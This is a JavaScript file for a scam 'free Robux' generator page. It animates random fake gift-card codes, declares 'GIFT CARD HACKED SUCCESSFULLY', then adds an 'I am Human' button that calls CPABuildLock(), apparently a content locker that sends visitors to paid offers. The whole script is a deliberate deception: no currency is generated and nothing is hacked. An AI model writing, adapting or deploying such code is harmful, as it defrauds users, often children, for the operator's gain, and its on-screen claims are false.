const firstStep = () => {
    document.getElementById("con1").style = "display: none;";
    document.getElementById("con2").style = "display: block;";
    document.getElementsByTagName("h1")[0].innerText = "Generating Robux To Your Account ...";
}
const secondStep = () => {
    document.getElementById("con2").style = "display: none;";
    document.getElementById("loading").style = "display: block;";
    var inter = setInterval(() => {
        var letters = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"];
        var full_code = [];
        var ran = '';
        for (var i = 1; i < 20; i++) {
            if ((i % 5) == 0) {
                ran = "-";
            }
            else if (i == 19 || i==18) {
                ran = "*";
            }
            else {
                ran = letters[Math.floor(Math.random() * 35)];
            }
            full_code.push(ran);
            console.log(ran)
        }
        document.getElementById("gen").innerText = full_code.join("");
    },50)
    setTimeout(() => {
        clearInterval(inter);
        document.getElementById("done").style.color = "red";
        document.getElementById("done").innerText = "GIFT CARD HACKED SUCCESSFULLY";
        document.getElementById("verify").innerText = "But You need To Verify That You Are Not Robot";
        document.getElementById("loading").innerHTML += "<button id='last' class='hum btn1' onclick='CPABuildLock();'>I am Human</button>";
    }, 5000)
}
